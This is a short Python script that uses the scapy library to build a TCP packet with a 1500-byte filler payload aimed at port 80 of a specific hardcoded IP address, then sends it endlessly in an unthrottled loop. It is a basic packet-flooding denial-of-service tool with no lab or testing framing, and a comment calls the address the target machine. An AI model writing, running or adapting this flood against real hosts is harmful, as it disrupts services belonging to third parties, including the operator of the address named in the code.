from scapy.all import *
from scapy.layers.inet import IP, TCP

# Craft a custom packet with a payload size of 1500 bytes
payload_data = b"A" * 1500  # Create a payload of 1500 bytes filled with 'A's

# Craft IP and TCP headers
ip_packet = IP(dst="45.83.216.83")  # Replace "target_ip" with the IP address of the target machine
tcp_packet = TCP(dport=80)  # Use port 80 for HTTP as an example

# Construct the complete packet
packet = ip_packet / tcp_packet / payload_data

# Send the packet
while 1 == 1:
    send(packet)
